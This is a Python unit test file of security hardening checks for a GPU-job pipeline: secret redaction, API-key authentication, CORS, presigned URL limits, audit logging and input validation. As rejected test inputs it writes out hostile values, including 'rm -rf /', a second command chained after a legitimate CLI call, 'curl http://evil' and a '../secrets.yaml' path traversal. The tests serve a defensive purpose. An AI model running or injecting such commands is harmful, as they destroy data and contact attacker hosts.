"""Phase 15 security hardening tests."""

from __future__ import annotations

import json
import unittest
from contextlib import redirect_stderr, redirect_stdout
from io import StringIO
from pathlib import Path
from tempfile import TemporaryDirectory
from unittest.mock import patch

from src.api import handlers
from src.cli import main as cli_main
from src.config.settings import load_runtime_settings
from src.observability.efficiency.report import write_efficiency_report
from src.providers.registry import build_provider_registry
from src.security.api_keys import hash_api_key
from src.security.audit_log import audit_gpu_cancel, audit_gpu_submit
from src.security.auth import authenticate_request, endpoint_requires_auth
from src.security.secret_redaction import redact_secrets, redact_text
from src.security.validation import validate_cli_command, validate_uploaded_config


class Phase15SecurityHardeningTests(unittest.TestCase):
    """Security baseline must protect write/heavy API and secrets."""

    def test_secret_redaction_covers_keys_text_bearer_and_urls(self) -> None:
        payload = {
            "api_key": "secret-token",
            "nested": {
                "message": "RUNPOD_API_KEY=secret-token Authorization: Bearer abc123",
                "url": "https://example.test/object?token=abc123&x=1",
            },
        }

        redacted = redact_secrets(payload, ("secret-token", "abc123"))
        text = json.dumps(redacted, sort_keys=True)

        self.assertNotIn("secret-token", text)
        self.assertNotIn("abc123", text)
        self.assertIn("[REDACTED]", text)
        self.assertEqual(redact_text("token=abc123", ()), "token=[REDACTED]")

    def test_reports_are_written_without_secrets(self) -> None:
        with TemporaryDirectory() as temp_dir:
            report_root = Path(temp_dir) / "reports"
            report = {
                "pipeline_run_id": 1,
                "summary": {"task_count": 1, "estimated_cloud_cost_usd": 0.0},
                "slowest_tasks": [{"name": "x", "api_key": "secret-token", "log": "token=abc123"}],
                "metrics": [{"name": "x", "secret": "secret-token"}],
                "quality_gates": {},
                "recommendations": [],
            }

            paths = write_efficiency_report(1, report, report_root)

            combined = Path(paths["json_path"]).read_text(encoding="utf-8") + Path(paths["markdown_path"]).read_text(encoding="utf-8")
            self.assertNotIn("secret-token", combined)
            self.assertNotIn("abc123", combined)
            self.assertIn("[REDACTED]", combined)

    def test_gpu_submit_requires_api_key_auth(self) -> None:
        settings = load_runtime_settings(env={"API_KEYS": "valid-key"})

        missing = authenticate_request("/compute/runpod/submit", "POST", settings)
        wrong = authenticate_request("/compute/runpod/submit", "POST", settings, api_key_header="wrong")
        valid = authenticate_request("/compute/runpod/submit", "POST", settings, api_key_header="valid-key")

        self.assertFalse(missing.allowed)
        self.assertFalse(wrong.allowed)
        self.assertTrue(valid.allowed)
        self.assertEqual(valid.principal, f"api_key:{hash_api_key('valid-key')[:16]}")

    def test_read_only_auth_is_configurable(self) -> None:
        open_settings = load_runtime_settings(env={"API_KEYS": "valid-key"})
        locked_settings = load_runtime_settings(env={"API_KEYS": "valid-key", "API_READ_ONLY_REQUIRES_AUTH": "true"})

        self.assertFalse(endpoint_requires_auth("/assets", "GET", open_settings))
        self.assertTrue(endpoint_requires_auth("/assets", "GET", locked_settings))
        self.assertFalse(authenticate_request("/assets", "GET", locked_settings).allowed)
        self.assertTrue(authenticate_request("/assets", "GET", locked_settings, api_key_header="valid-key").allowed)

    def test_uploaded_configs_reject_shell_traversal_bad_prefix_and_bad_image(self) -> None:
        settings = load_runtime_settings(env={"RUNPOD_ALLOWED_IMAGES": "allowed-image"})

        with self.assertRaisesRegex(ValueError, "shell commands"):
            validate_uploaded_config({"command": "rm -rf /"}, settings)
        with self.assertRaisesRegex(ValueError, "shell commands"):
            validate_uploaded_config(
                {
                    "command": (
                        "python3 -m src.cli train run --config configs/train.yaml; "
                        "rm -rf /"
                    )
                },
                settings,
            )
        with self.assertRaisesRegex(ValueError, "path traversal"):
            validate_uploaded_config({"config_path": "../secrets.yaml"}, settings)
        with self.assertRaisesRegex(ValueError, "prefix"):
            validate_uploaded_config({"dataset_uri": "s3://bucket/private/data.parquet"}, settings)
        with self.assertRaisesRegex(ValueError, "image"):
            validate_uploaded_config({"runpod_image": "evil-image"}, settings)

    def test_cli_command_validation_allows_only_project_cli_by_default(self) -> None:
        safe = "python3 -m src.cli train run --config configs/train.yaml"

        self.assertEqual(validate_cli_command(safe), safe)
        with self.assertRaisesRegex(ValueError, "only python3 -m src.cli"):
            validate_cli_command("python3 -m http.server")
        with self.assertRaisesRegex(ValueError, "shell commands"):
            validate_cli_command(f"{safe} && curl http://evil")

    def test_cli_rejects_dangerous_config_path_before_reading(self) -> None:
        stdout = StringIO()
        stderr = StringIO()

        with redirect_stdout(stdout), redirect_stderr(stderr):
            exit_code = cli_main(["cost", "estimate", "--config", "configs/../configs/train_gpu.yaml"])

        self.assertEqual(exit_code, 1)
        self.assertIn("path traversal", stderr.getvalue())

    def test_presign_expiry_and_storage_prefix_are_guarded(self) -> None:
        with TemporaryDirectory() as temp_dir:
            settings = load_runtime_settings(
                env={
                    "DATA_LAKE_ROOT": str(Path(temp_dir) / "lake"),
                    "SQLITE_PATH": str(Path(temp_dir) / "db.sqlite3"),
                    "MAX_PRESIGNED_URL_EXPIRY_SECONDS": "60",
                    "ALLOWED_STORAGE_PREFIXES": "reports/",
                },
                base_dir=Path(temp_dir),
            )
            registry = build_provider_registry(settings)
            registry.get_storage().put_bytes("reports/smoke.txt", b"ok")

            presign = handlers.storage_presign(registry, "reports/smoke.txt", 60)
            with self.assertRaisesRegex(ValueError, "expiry"):
                handlers.storage_presign(registry, "reports/smoke.txt", 61)
            with self.assertRaisesRegex(ValueError, "prefix"):
                handlers.storage_presign(registry, "private/smoke.txt", 60)

        self.assertEqual(presign["expires_seconds"], 60)
        self.assertEqual(presign["path"], "reports/smoke.txt")

    def test_audit_log_records_gpu_submit_and_cancel_without_tokens(self) -> None:
        with TemporaryDirectory() as temp_dir:
            audit_path = Path(temp_dir) / "audit.jsonl"
            settings = load_runtime_settings(
                env={"AUDIT_LOG_PATH": str(audit_path), "RUNPOD_API_KEY": "secret-token"},
                base_dir=Path(temp_dir),
            )

            audit_gpu_submit(settings, principal="api_key:test", status="started", metadata={"token": "secret-token"})
            audit_gpu_cancel(settings, principal="api_key:test", status="CANCELLED", job_id="job-1", metadata={"authorization": "Bearer secret-token"})

            lines = audit_path.read_text(encoding="utf-8").splitlines()

        self.assertEqual(len(lines), 2)
        combined = "\n".join(lines)
        self.assertIn("gpu.submit", combined)
        self.assertIn("gpu.cancel", combined)
        self.assertNotIn("secret-token", combined)
        self.assertIn("[REDACTED]", combined)

    def test_cors_wildcard_is_rejected(self) -> None:
        with self.assertRaisesRegex(ValueError, "CORS_ALLOWED_ORIGINS"):
            load_runtime_settings(env={"CORS_ALLOWED_ORIGINS": "*"})

    def test_api_runpod_submit_handler_validates_config_before_submission(self) -> None:
        with TemporaryDirectory() as temp_dir:
            settings = load_runtime_settings(
                env={
                    "COMPUTE_PROVIDER": "runpod",
                    "AUDIT_LOG_PATH": str(Path(temp_dir) / "audit.jsonl"),
                    "RUNPOD_ALLOWED_IMAGES": "allowed-image",
                },
                base_dir=Path(temp_dir),
            )
            registry = build_provider_registry(settings)

            with self.assertRaisesRegex(ValueError, "shell commands"):
                handlers.compute_runpod_submit(registry, {"command": "curl http://evil"}, principal="api_key:test")


if __name__ == "__main__":
    unittest.main()
